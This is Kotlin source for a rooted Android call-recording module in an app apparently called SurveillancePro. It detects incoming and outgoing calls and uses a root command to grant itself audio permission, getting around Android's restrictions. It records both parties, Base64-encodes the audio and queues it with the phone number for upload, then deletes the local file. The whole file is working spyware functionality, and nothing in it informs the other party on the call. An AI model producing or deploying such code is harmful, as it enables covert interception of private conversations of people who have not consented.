package com.surveillancepro.android.root

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Enregistreur d'appels téléphoniques (ROOT REQUIS).
 * Détecte automatiquement les appels entrants/sortants et enregistre l'audio.
 * Utilise la source audio VOICE_CALL qui nécessite un accès root
 * pour contourner les restrictions Android.
 */
class CallRecorder : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (!RootManager.isRooted()) return
        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
        val phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
            ?: intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER)
            ?: ""

        when {
            state == TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                startRecording(context, phoneNumber)
            }
            state == TelephonyManager.EXTRA_STATE_IDLE -> {
                stopRecordingAndSave(context, phoneNumber)
            }
            intent.action == Intent.ACTION_NEW_OUTGOING_CALL -> {
                val outNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER) ?: ""
                saveOutgoingNumber(context, outNumber)
            }
        }
    }

    companion object {
        private const val TAG = "CallRecorder"
        private var recorder: MediaRecorder? = null
        private var recordingFile: File? = null
        private var recordingStartTime = 0L
        private var currentNumber = ""
        private var isOutgoing = false
        private val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)

        private fun saveOutgoingNumber(context: Context, number: String) {
            currentNumber = number
            isOutgoing = true
        }

        private fun startRecording(context: Context, phoneNumber: String) {
            if (recorder != null) return
            if (phoneNumber.isNotEmpty()) currentNumber = phoneNumber

            // Utiliser root pour autoriser l'accès à VOICE_CALL
            RootManager.executeRootCommand(
                "appops set ${context.packageName} RECORD_AUDIO allow"
            )

            val outputDir = File(context.cacheDir, "call_records")
            outputDir.mkdirs()
            recordingFile = File(outputDir, "call_${System.currentTimeMillis()}.m4a")
            recordingStartTime = System.currentTimeMillis()

            try {
                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(context)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }

                recorder?.apply {
                    // VOICE_CALL capture les deux côtés (appelant + appelé)
                    @Suppress("DEPRECATION")
                    setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(64000)
                    setAudioSamplingRate(16000)
                    setOutputFile(recordingFile!!.absolutePath)
                    prepare()
                    start()
                }
                Log.d(TAG, "Call recording started: $currentNumber")
            } catch (e: Exception) {
                Log.w(TAG, "Call recording failed: ${e.message}")
                // Fallback : essayer MIC si VOICE_CALL échoue
                try {
                    recorder?.release()
                    recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        MediaRecorder(context)
                    } else {
                        @Suppress("DEPRECATION")
                        MediaRecorder()
                    }
                    recorder?.apply {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                        setAudioEncodingBitRate(64000)
                        setAudioSamplingRate(16000)
                        setOutputFile(recordingFile!!.absolutePath)
                        prepare()
                        start()
                    }
                    Log.d(TAG, "Fallback to MIC recording")
                } catch (e2: Exception) {
                    Log.e(TAG, "Both recording methods failed: ${e2.message}")
                    recorder = null
                    recordingFile = null
                }
            }
        }

        private fun stopRecordingAndSave(context: Context, phoneNumber: String) {
            if (recorder == null || recordingFile == null) return

            try {
                recorder?.stop()
            } catch (_: Exception) {}

            try {
                recorder?.release()
            } catch (_: Exception) {}
            recorder = null

            val durationMs = System.currentTimeMillis() - recordingStartTime
            val file = recordingFile ?: return
            recordingFile = null

            if (!file.exists() || file.length() < 1024) {
                file.delete()
                return
            }

            // Limiter la taille (max 5 Mo pour l'envoi)
            val maxSize = 5 * 1024 * 1024L
            if (file.length() > maxSize) {
                Log.w(TAG, "Recording too large (${file.length() / 1024} Ko), metadata only")
                val queue = EventQueue.getInstance(context)
                queue.enqueue("call_recording", mapOf(
                    "number" to currentNumber,
                    "isOutgoing" to isOutgoing,
                    "durationSeconds" to (durationMs / 1000),
                    "sizeBytes" to file.length(),
                    "status" to "too_large",
                    "timestamp" to dateFormat.format(Date()),
                ))
                file.delete()
                return
            }

            try {
                val audioBase64 = Base64.encodeToString(file.readBytes(), Base64.NO_WRAP)
                val queue = EventQueue.getInstance(context)
                queue.enqueue("call_recording", mapOf(
                    "number" to currentNumber,
                    "isOutgoing" to isOutgoing,
                    "durationSeconds" to (durationMs / 1000),
                    "sizeBytes" to file.length(),
                    "audioBase64" to audioBase64,
                    "format" to "m4a",
                    "status" to "recorded",
                    "timestamp" to dateFormat.format(Date()),
                ))
                Log.d(TAG, "Call recorded: $currentNumber (${durationMs / 1000}s, ${file.length() / 1024} Ko)")
            } catch (e: Exception) {
                Log.w(TAG, "Failed to encode recording: ${e.message}")
            }

            file.delete()
            currentNumber = ""
            isOutgoing = false
        }
    }
}
